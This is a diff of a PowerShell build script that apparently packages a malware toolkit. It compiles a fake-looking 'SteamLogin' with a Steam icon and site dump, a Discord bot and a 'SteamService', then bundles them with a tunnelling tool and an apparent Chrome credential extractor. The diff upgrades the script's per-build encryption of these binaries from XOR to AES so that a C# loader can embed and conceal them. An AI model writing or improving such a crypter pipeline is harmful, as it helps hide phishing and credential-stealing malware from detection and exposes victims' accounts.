@@ -14,20 +14,40 @@ pyinstaller --noconfirm --onefile --windowed --icon="login\steam.ico" --add-data
 pyinstaller --noconfirm --onefile --windowed --icon="login\steam.ico" --noupx --name "discord_bot" "websocket\discord_bot.py"
 pyinstaller --noconfirm --onefile --windowed --icon="login\steam.ico" --add-data "okoshko\site_dump;site_dump" --add-data "login\steam.ico;." --noupx --name "SteamService" "okoshko\steam_notice.py"
 
-Write-Host "[*] Phase 3: Binary Encryption (Dynamic XOR)..." -ForegroundColor Cyan
-$XorKey = Get-Random -Minimum 1 -Maximum 254
-Write-Host "    [+] Generated dynamic XOR key: 0x$($XorKey.ToString('X2'))" -ForegroundColor Green
+Write-Host "[*] Phase 3: Binary Encryption (AES-256 CBC)..." -ForegroundColor Cyan
+$Aes = [System.Security.Cryptography.Aes]::Create()
+$Aes.GenerateKey()
+$Aes.GenerateIV()
+$KeyBase64 = [System.Convert]::ToBase64String($Aes.Key)
+$IvBase64 = [System.Convert]::ToBase64String($Aes.IV)
+
+Write-Host "    [+] Generated dynamic AES Key: $($KeyBase64.Substring(0, 10))..." -ForegroundColor Green
+Write-Host "    [+] Generated dynamic AES IV:  $($IvBase64.Substring(0, 10))..." -ForegroundColor Green
 
 $ConstantsPath = "defense\Constants.cs"
-$Content = Get-Content $ConstantsPath
-$NewContent = $Content -replace 'public const byte RESOURCE_XOR_KEY = 0x[0-9A-F]{2};', "public const byte RESOURCE_XOR_KEY = 0x$($XorKey.ToString('X2'));"
-Set-Content $ConstantsPath $NewContent
+$Content = Get-Content $ConstantsPath -Raw
+$Content = $Content -replace 'public const string RESOURCE_AES_KEY = ".*?";', "public const string RESOURCE_AES_KEY = `"$KeyBase64`";"
+$Content = $Content -replace 'public const string RESOURCE_AES_IV = ".*?";', "public const string RESOURCE_AES_IV = `"$IvBase64`";"
+Set-Content $ConstantsPath $Content
 
-function Invoke-XorEncryption {
-    param([string]$FilePath, [byte]$Key)
+function Invoke-AesEncryption {
+    param([string]$FilePath, [string]$KeyBase64, [string]$IvBase64)
+    $Key = [System.Convert]::FromBase64String($KeyBase64)
+    $Iv = [System.Convert]::FromBase64String($IvBase64)
     $Bytes = [System.IO.File]::ReadAllBytes($FilePath)
-    for ($i = 0; $i -lt $Bytes.Count; $i++) { $Bytes[$i] = $Bytes[$i] -bxor $Key }
-    [System.IO.File]::WriteAllBytes($FilePath, $Bytes)
+    
+    $AesObj = [System.Security.Cryptography.Aes]::Create()
+    $AesObj.Key = $Key
+    $AesObj.IV = $Iv
+    $AesObj.Mode = [System.Security.Cryptography.CipherMode]::CBC
+    $AesObj.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
+    
+    $Encryptor = $AesObj.CreateEncryptor()
+    $EncryptedBytes = $Encryptor.TransformFinalBlock($Bytes, 0, $Bytes.Length)
+    [System.IO.File]::WriteAllBytes($FilePath, $EncryptedBytes)
+    
+    $Encryptor.Dispose()
+    $AesObj.Dispose()
 }
 
 $FilesToEncrypt = @("dist\SteamLogin.exe", "dist\discord_bot.exe", "dist\SteamService.exe", "tools\bore.exe", "tools\chromelevator.exe")
@@ -35,8 +55,8 @@ foreach ($file in $FilesToEncrypt) {
     if (Test-Path $file) {
         $binFile = $file -replace "\.exe", ".bin"
         Move-Item -Path $file -Destination $binFile -Force
-        Invoke-XorEncryption -FilePath $binFile -Key $XorKey
-        Write-Host "    [+] Encrypted $(Split-Path $file -Leaf)" -ForegroundColor Green
+        Invoke-AesEncryption -FilePath $binFile -KeyBase64 $KeyBase64 -IvBase64 $IvBase64
+        Write-Host "    [+] AES Encrypted $(Split-Path $file -Leaf)" -ForegroundColor Green
         
         # Sync to root for C# embedding
         $rootBin = Join-Path $PSScriptRoot (Split-Path $binFile -Leaf)
